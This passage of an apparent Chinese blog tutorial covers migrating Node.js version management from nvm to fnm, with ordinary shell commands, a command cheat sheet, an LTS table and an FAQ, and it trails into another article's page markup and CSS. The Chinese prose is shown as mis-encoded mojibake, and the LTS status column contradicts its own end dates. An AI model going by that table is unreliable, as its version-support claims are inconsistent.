<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ–¹å¼ä¸€ï¼šé€šè¿‡ LTS ä»£å·å®‰è£…ï¼ˆæ¨èï¼Œè‡ªåŠ¨è·å–æœ€æ–°è¡¥ä¸ç‰ˆæœ¬ï¼‰</span>
fnm install lts/fermium   <span class="hljs-comment"># v14.x</span>
fnm install lts/gallium   <span class="hljs-comment"># v16.x</span>
fnm install lts/hydrogen  <span class="hljs-comment"># v18.x</span>
fnm install lts/iron      <span class="hljs-comment"># v20.x</span>
fnm install lts/jod       <span class="hljs-comment"># v22.x</span>

<span class="hljs-comment"># æ–¹å¼äºŒï¼šé€šè¿‡å¤§ç‰ˆæœ¬å·å®‰è£…</span>
fnm install 14
fnm install 16
fnm install 18
fnm install 20
fnm install 22

<span class="hljs-comment"># æ–¹å¼ä¸‰ï¼šå®‰è£…ç²¾ç¡®ç‰ˆæœ¬</span>
fnm install 18.20.8
fnm install 20.19.6
</code></pre>
<p>è®¾ç½®é»˜è®¤ç‰ˆæœ¬ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">fnm default 22
</code></pre>
<h4 data-id="heading-23">ç¬¬å››æ­¥ï¼šå¤„ç†å…¨å±€ npm åŒ…</h4>
<p>è¿™æ˜¯å¾ˆå¤šäººå¿½ç•¥çš„ä¸€æ­¥ï¼nvm ä¸‹å®‰è£…çš„å…¨å±€åŒ…ä¸ä¼šè‡ªåŠ¨è¿ç§»ã€‚</p>
<p>æŸ¥çœ‹ nvm ä¸­çš„å…¨å±€åŒ…ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ‡æ¢åˆ° nvm çš„æŸä¸ªç‰ˆæœ¬</span>
<span class="hljs-built_in">export</span> PATH=<span class="hljs-string">"<span class="hljs-variable">$HOME</span>/.nvm/versions/node/v20.19.6/bin:<span class="hljs-variable">$PATH</span>"</span>
npm list -g --depth=0
</code></pre>
<p>åœ¨ fnm çš„å¯¹åº”ç‰ˆæœ¬ä¸­é‡æ–°å®‰è£…ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">fnm use 20
npm install -g typescript ts-node nodemon pm2 <span class="hljs-comment"># ä½ éœ€è¦çš„åŒ…</span>
</code></pre>
<p><strong>Pro Tip:</strong> å¯ä»¥å†™ä¸ªè„šæœ¬æ‰¹é‡å¤„ç†ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># migrate-global-packages.sh</span>

<span class="hljs-comment"># ä½ å¸¸ç”¨çš„å…¨å±€åŒ…</span>
PACKAGES=<span class="hljs-string">"typescript ts-node nodemon pm2 pnpm yarn"</span>

<span class="hljs-keyword">for</span> version <span class="hljs-keyword">in</span> 18 20 22; <span class="hljs-keyword">do</span>
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"Installing global packages for Node <span class="hljs-variable">$version</span>..."</span>
  fnm use <span class="hljs-variable">$version</span>
  npm install -g <span class="hljs-variable">$PACKAGES</span>
<span class="hljs-keyword">done</span>
</code></pre>
<h4 data-id="heading-24">ç¬¬äº”æ­¥ï¼šæ³¨é‡Šæ‰ nvm é…ç½®</h4>
<p>ç¼–è¾‘ä½ çš„ Shell é…ç½®æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ~/.zshrc æˆ– ~/.bashrc</span>

<span class="hljs-comment"># nvm - å·²è¿ç§»åˆ° fnmï¼Œæ³¨é‡Šæ‰é¿å…å†²çª</span>
<span class="hljs-comment"># export NVM_DIR="$HOME/.nvm"</span>
<span class="hljs-comment"># [ -s "$NVM_DIR/nvm.sh" ] &amp;&amp; \. "$NVM_DIR/nvm.sh"</span>
<span class="hljs-comment"># [ -s "$NVM_DIR/bash_completion" ] &amp;&amp; \. "$NVM_DIR/bash_completion"</span>
</code></pre>
<h4 data-id="heading-25">ç¬¬å…­æ­¥ï¼šéªŒè¯è¿ç§»ç»“æœ</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># é‡æ–°åŠ è½½é…ç½®</span>
<span class="hljs-built_in">source</span> ~/.zshrc  <span class="hljs-comment"># æˆ– source ~/.bashrc</span>

<span class="hljs-comment"># éªŒè¯ fnm å·¥ä½œæ­£å¸¸</span>
fnm list
fnm current
node -v
npm -v
<span class="hljs-built_in">which</span> node

<span class="hljs-comment"># æµ‹è¯•è‡ªåŠ¨åˆ‡æ¢</span>
<span class="hljs-built_in">cd</span> /path/to/project-with-nvmrc
<span class="hljs-comment"># åº”è¯¥çœ‹åˆ° "Using Node vX.X.X"</span>
node -v
</code></pre>
<h4 data-id="heading-26">ç¬¬ä¸ƒæ­¥ï¼šåˆ é™¤ nvmï¼ˆå¯é€‰ä½†æ¨èï¼‰</h4>
<p>ç¡®è®¤ä¸€åˆ‡æ­£å¸¸åï¼Œå¯ä»¥åˆ é™¤ nvm é‡Šæ”¾ç£ç›˜ç©ºé—´ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">rm</span> -rf ~/.nvm

<span class="hljs-comment"># å¦‚æœé‡åˆ°æƒé™é—®é¢˜</span>
sudo <span class="hljs-built_in">rm</span> -rf ~/.nvm
</code></pre>
<h3 data-id="heading-27">å‘½ä»¤é€ŸæŸ¥è¡¨</h3>




























































<table><thead><tr><th>åŠŸèƒ½</th><th>nvm å‘½ä»¤</th><th>fnm å‘½ä»¤</th></tr></thead><tbody><tr><td>å®‰è£…æŒ‡å®šç‰ˆæœ¬</td><td><code>nvm install 20</code></td><td><code>fnm install 20</code></td></tr><tr><td>å®‰è£…æœ€æ–° LTS</td><td><code>nvm install --lts</code></td><td><code>fnm install --lts</code></td></tr><tr><td>å®‰è£…æŒ‡å®š LTS</td><td><code>nvm install --lts=iron</code></td><td><code>fnm install lts/iron</code></td></tr><tr><td>åˆ‡æ¢ç‰ˆæœ¬</td><td><code>nvm use 20</code></td><td><code>fnm use 20</code></td></tr><tr><td>è®¾ç½®é»˜è®¤ç‰ˆæœ¬</td><td><code>nvm alias default 20</code></td><td><code>fnm default 20</code></td></tr><tr><td>æŸ¥çœ‹å·²å®‰è£…ç‰ˆæœ¬</td><td><code>nvm ls</code></td><td><code>fnm list</code></td></tr><tr><td>æŸ¥çœ‹è¿œç¨‹å¯ç”¨ç‰ˆæœ¬</td><td><code>nvm ls-remote</code></td><td><code>fnm list-remote</code></td></tr><tr><td>æŸ¥çœ‹å½“å‰ç‰ˆæœ¬</td><td><code>nvm current</code></td><td><code>fnm current</code></td></tr><tr><td>å¸è½½ç‰ˆæœ¬</td><td><code>nvm uninstall 18</code></td><td><code>fnm uninstall 18</code></td></tr><tr><td>åœ¨æŒ‡å®šç‰ˆæœ¬æ‰§è¡Œå‘½ä»¤</td><td><code>nvm exec 18 node -v</code></td><td><code>fnm exec --using=18 node -v</code></td></tr></tbody></table>
<h3 data-id="heading-28">LTS ç‰ˆæœ¬ä»£å·å‚è€ƒ</h3>





















































<table><thead><tr><th>ä»£å·</th><th>ç‰ˆæœ¬</th><th>å‘å¸ƒæ—¥æœŸ</th><th>LTS å¼€å§‹</th><th>ç»´æŠ¤ç»“æŸ</th><th>çŠ¶æ€</th></tr></thead><tbody><tr><td>Jod</td><td>v22.x</td><td>2024-04</td><td>2024-10</td><td>2027-04</td><td>âœ… Active LTS</td></tr><tr><td>Iron</td><td>v20.x</td><td>2023-04</td><td>2023-10</td><td>2026-04</td><td>âœ… Active LTS</td></tr><tr><td>Hydrogen</td><td>v18.x</td><td>2022-04</td><td>2022-10</td><td>2025-04</td><td>âš ï¸ Maintenance</td></tr><tr><td>Gallium</td><td>v16.x</td><td>2021-04</td><td>2021-10</td><td>2024-09</td><td>âŒ End-of-Life</td></tr><tr><td>Fermium</td><td>v14.x</td><td>2020-04</td><td>2020-10</td><td>2023-04</td><td>âŒ End-of-Life</td></tr></tbody></table>
<blockquote>
<p><strong>å»ºè®®</strong>ï¼šæ–°é¡¹ç›®ä½¿ç”¨ v20 æˆ– v22ï¼Œè€é¡¹ç›®å°½å¿«å‡çº§åˆ°è‡³å°‘ v18ã€‚</p>
</blockquote>
<h3 data-id="heading-29">è¿›é˜¶æŠ€å·§</h3>
<h4 data-id="heading-30">1. é…ç½®ç‰ˆæœ¬æ–‡ä»¶æŸ¥æ‰¾ç­–ç•¥</h4>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œfnm åªåœ¨å½“å‰ç›®å½•æŸ¥æ‰¾ <code>.node-version</code> æˆ– <code>.nvmrc</code>ã€‚å¦‚æœä½ çš„é¡¹ç›®ç»“æ„æ¯”è¾ƒæ·±ï¼Œå¯ä»¥å¯ç”¨é€’å½’æŸ¥æ‰¾ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">eval</span> <span class="hljs-string">"<span class="hljs-subst">$(fnm env --use-on-cd --version-file-strategy recursive)</span>"</span>
</code></pre>
<h4 data-id="heading-31">2. å¯ç”¨ Corepack</h4>
<p>Corepack æ˜¯ Node.js å†…ç½®çš„åŒ…ç®¡ç†å™¨ç‰ˆæœ¬ç®¡ç†å·¥å…·ï¼Œå¯ä»¥é”å®š pnpm/yarn ç‰ˆæœ¬ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">eval</span> <span class="hljs-string">"<span class="hljs-subst">$(fnm env --use-on-cd --corepack-enabled)</span>"</span>
</code></pre>
<h4 data-id="heading-32">3. è‡ªå®šä¹‰å®‰è£…ç›®å½•</h4>
<p>é»˜è®¤å®‰è£…åœ¨ <code>~/.local/share/fnm</code>ï¼Œå¯ä»¥è‡ªå®šä¹‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">export</span> FNM_DIR=<span class="hljs-string">"/path/to/custom/fnm"</span>
<span class="hljs-built_in">eval</span> <span class="hljs-string">"<span class="hljs-subst">$(fnm env --use-on-cd)</span>"</span>
</code></pre>
<h4 data-id="heading-33">4. ä½¿ç”¨å›½å†…é•œåƒåŠ é€Ÿ</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä¸´æ—¶ä½¿ç”¨</span>
fnm install 20 --node-dist-mirror=https://npmmirror.com/mirrors/node

<span class="hljs-comment"># æ°¸ä¹…é…ç½®</span>
<span class="hljs-built_in">export</span> FNM_NODE_DIST_MIRROR=<span class="hljs-string">"https://npmmirror.com/mirrors/node"</span>
</code></pre>
<h4 data-id="heading-34">5. åœ¨è„šæœ¬ä¸­ä½¿ç”¨ fnm</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># ç¡®ä¿ fnm ç¯å¢ƒå·²åŠ è½½</span>
<span class="hljs-built_in">eval</span> <span class="hljs-string">"<span class="hljs-subst">$(fnm env)</span>"</span>

<span class="hljs-comment"># ä½¿ç”¨æŒ‡å®šç‰ˆæœ¬æ‰§è¡Œ</span>
fnm use 20
node your-script.js

<span class="hljs-comment"># æˆ–è€…ç”¨ exec</span>
fnm <span class="hljs-built_in">exec</span> --using=20 node your-script.js
</code></pre>
<h3 data-id="heading-35">å¸¸è§é—®é¢˜ FAQ</h3>
<h4 data-id="heading-36">Q: fnm å®‰è£…çš„ Node åœ¨å“ªé‡Œï¼Ÿ</h4>
<pre><code class="hljs language-bash" lang="bash">~/.local/share/fnm/node-versions/
</code></pre>
<p>æ¯ä¸ªç‰ˆæœ¬æ˜¯ä¸€ä¸ªç‹¬ç«‹ç›®å½•ï¼Œç»“æ„æ¸…æ™°ã€‚</p>
<h4 data-id="heading-37">Q: ä¸ºä»€ä¹ˆ <code>which node</code> æ˜¾ç¤ºçš„è·¯å¾„å¾ˆå¥‡æ€ªï¼Ÿ</h4>
<p>fnm ä½¿ç”¨"å¤š Shell"æœºåˆ¶ï¼Œæ¯ä¸ª Shell ä¼šè¯æœ‰ç‹¬ç«‹çš„ PATHï¼š</p>
<pre><code class="hljs language-bash" lang="bash">$ <span class="hljs-built_in">which</span> node
/Users/xxx/.local/state/fnm_multishells/12345_1234567890/bin/node
</code></pre>
<p>è¿™æ˜¯æ­£å¸¸çš„ï¼Œç¡®ä¿äº†ä¸åŒç»ˆç«¯çª—å£å¯ä»¥ä½¿ç”¨ä¸åŒç‰ˆæœ¬ã€‚</p>
<h4 data-id="heading-38">Q: å¦‚ä½•åœ¨ VS Code ä¸­ä½¿ç”¨ fnm ç®¡ç†çš„ Nodeï¼Ÿ</h4>
<p>VS Code ä¼šè‡ªåŠ¨æ£€æµ‹ fnmã€‚å¦‚æœé‡åˆ°é—®é¢˜ï¼Œå¯ä»¥åœ¨ <code>settings.json</code> ä¸­é…ç½®ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"terminal.integrated.env.osx"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"PATH"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"${env:PATH}"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>æˆ–è€…åœ¨é¡¹ç›®æ ¹ç›®å½•åˆ›å»º <code>.vscode/settings.json</code>ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"eslint.runtime"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"node"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-39">Q: fnm æ”¯æŒ .nvmrc å—ï¼Ÿ</h4>
<p>å®Œå…¨æ”¯æŒï¼fnm ä¼šæŒ‰ä»¥ä¸‹é¡ºåºæŸ¥æ‰¾ç‰ˆæœ¬æ–‡ä»¶ï¼š</p>
<ol>
<li><code>.node-version</code></li>
<li><code>.nvmrc</code></li>
<li><code>package.json</code> çš„ <code>engines.node</code> å­—æ®µ</li>
</ol>
<h4 data-id="heading-40">Q: å¦‚ä½•å›é€€åˆ° nvmï¼Ÿ</h4>
<p>å¦‚æœä½ æƒ³å›é€€ï¼ˆè™½ç„¶æˆ‘ä¸å»ºè®®ï¼‰ï¼Œåªéœ€ï¼š</p>
<ol>
<li>æ³¨é‡Šæ‰ fnm é…ç½®</li>
<li>å–æ¶ˆæ³¨é‡Š nvm é…ç½®</li>
<li>é‡æ–°åŠ è½½ Shell</li>
</ol>
<p>ä½ çš„ nvm æ•°æ®ï¼ˆå¦‚æœæ²¡åˆ ï¼‰è¿˜åœ¨ <code>~/.nvm</code>ã€‚</p>
<h3 data-id="heading-41">æ€»ç»“ï¼šå€¼å¾—è¿ç§»å—ï¼Ÿ</h3>
<p><strong>ç»å¯¹å€¼å¾—ã€‚</strong></p>
<p>è¿ç§»æˆæœ¬ï¼š</p>
<ul>
<li>æ—¶é—´ï¼šçº¦ 15-30 åˆ†é’Ÿ</li>
<li>å­¦ä¹ æ›²çº¿ï¼šå‡ ä¹ä¸ºé›¶ï¼ˆå‘½ä»¤é«˜åº¦ç›¸ä¼¼ï¼‰</li>
<li>é£é™©ï¼šæä½ï¼ˆå¯éšæ—¶å›é€€ï¼‰</li>
</ul>
<p>è·å¾—æ”¶ç›Šï¼š</p>
<ul>
<li>ç»ˆç«¯å¯åŠ¨å¿« 5-10 å€</li>
<li>ç‰ˆæœ¬åˆ‡æ¢å¿« 20-30 å€</li>
<li>è‡ªåŠ¨åˆ‡æ¢ç‰ˆæœ¬ï¼Œå‘Šåˆ«æ‰‹åŠ¨ <code>nvm use</code></li>
<li>è·¨å¹³å°ä¸€è‡´æ€§ï¼Œå›¢é˜Ÿåä½œæ›´é¡ºç•…</li>
<li>æ›´å°‘çš„ Bug å’Œæ€ªå¼‚è¡Œä¸º</li>
</ul>
<p>å¦‚æœä½ æ¯å¤©è¦æ‰“å¼€å‡ åæ¬¡ç»ˆç«¯ã€åœ¨å¤šä¸ªé¡¹ç›®é—´åˆ‡æ¢ï¼Œfnm èŠ‚çœçš„æ—¶é—´ç´¯ç§¯èµ·æ¥æ˜¯éå¸¸å¯è§‚çš„ã€‚æ›´é‡è¦çš„æ˜¯ï¼Œé‚£ç§<strong>ä¸æ»‘æ— æ„Ÿ</strong>çš„ä½“éªŒï¼Œä¼šè®©ä½ çš„å¼€å‘å¿ƒæƒ…éƒ½å˜å¥½ã€‚</p>
<hr/>
<p><strong>å‚è€ƒèµ„æ–™ï¼š</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FSchniz%2Ffnm" target="_blank" title="https://github.com/Schniz/fnm" ref="nofollow noopener noreferrer">fnm GitHub ä»“åº“</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2Fen%2Fabout%2Freleases%2F" target="_blank" title="https://nodejs.org/en/about/releases/" ref="nofollow noopener noreferrer">Node.js å‘å¸ƒè®¡åˆ’</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FSchniz%2Ffnm%23performance" target="_blank" title="https://github.com/Schniz/fnm#performance" ref="nofollow noopener noreferrer">nvm vs fnm æ€§èƒ½å¯¹æ¯”</a></li>
</ul>
<hr/>
<p><em>å¦‚æœè¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰å¸®åŠ©ï¼Œæ¬¢è¿ç‚¹èµæ”¶è—ã€‚æœ‰é—®é¢˜å¯ä»¥åœ¨è¯„è®ºåŒºäº¤æµï¼</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è½»æ¾æå®šå¹´åº¦æŠ¥å‘Šå¯è§†åŒ–ï¼Œäº”åˆ†é’Ÿç”¨ AntV + Trae Solo å¿«é€Ÿæ„å»ºæ™ºèƒ½å›¾è¡¨ç”Ÿæˆå™¨ï¼]]></title>    <link>https://juejin.cn/post/7581741663182749731</link>    <guid>https://juejin.cn/post/7581741663182749731</guid>    <pubDate>2025-12-09T23:15:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581741663182749731" data-draft-id="7581406561684963374" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è½»æ¾æå®šå¹´åº¦æŠ¥å‘Šå¯è§†åŒ–ï¼Œäº”åˆ†é’Ÿç”¨ AntV + Trae Solo å¿«é€Ÿæ„å»ºæ™ºèƒ½å›¾è¡¨ç”Ÿæˆå™¨ï¼"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,å‰ç«¯,Trae"/> <meta itemprop="datePublished" content="2025-12-09T23:15:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤§æ¨¡å‹çœŸå¥½ç©"/> <meta itemprop="url" content="https://juejin.cn/user/3140624091453053"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è½»æ¾æå®šå¹´åº¦æŠ¥å‘Šå¯è§†åŒ–ï¼Œäº”åˆ†é’Ÿç”¨ AntV + Trae Solo å¿«é€Ÿæ„å»ºæ™ºèƒ½å›¾è¡¨ç”Ÿæˆå™¨ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3140624091453053/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤§æ¨¡å‹çœŸå¥½ç©
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T23:15:05.000Z" title="Tue Dec 09 2025 23:15:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»15åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body 